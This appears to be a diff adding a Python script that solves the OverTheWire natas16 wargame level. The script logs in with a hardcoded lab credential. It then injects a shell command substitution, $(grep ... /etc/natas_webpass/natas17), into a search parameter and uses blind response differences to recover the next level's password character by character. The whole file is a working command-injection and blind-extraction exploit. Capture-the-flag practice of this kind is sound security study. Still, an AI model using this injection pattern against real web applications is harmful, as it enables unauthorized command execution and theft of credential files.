@@ -1,0 +1,27 @@
+#!/usr/bin/env python
+
+import requests, sys, urllib.parse
+
+url = "http://natas16.natas.labs.overthewire.org/"
+auth = ("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
+
+unique_dict_match = "Africans"
+all_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+matched_chars = ""
+password = ""
+
+for char in all_chars:
+  response = requests.get(url, auth=auth, params=[("needle", unique_dict_match + "$(grep " + char + " /etc/natas_webpass/natas17)"), ("submit", "Search")])
+
+  if unique_dict_match not in response.text:
+    matched_chars += char
+    print(matched_chars)
+
+while len(password) < 32:
+  for char in matched_chars:
+    response = requests.get(url, auth=auth, params=[("needle", unique_dict_match + "$(grep ^" + password + char + " /etc/natas_webpass/natas17)"), ("submit", "Search")])
+
+    if unique_dict_match not in response.text:
+      password += char
+      print(password)
+      break
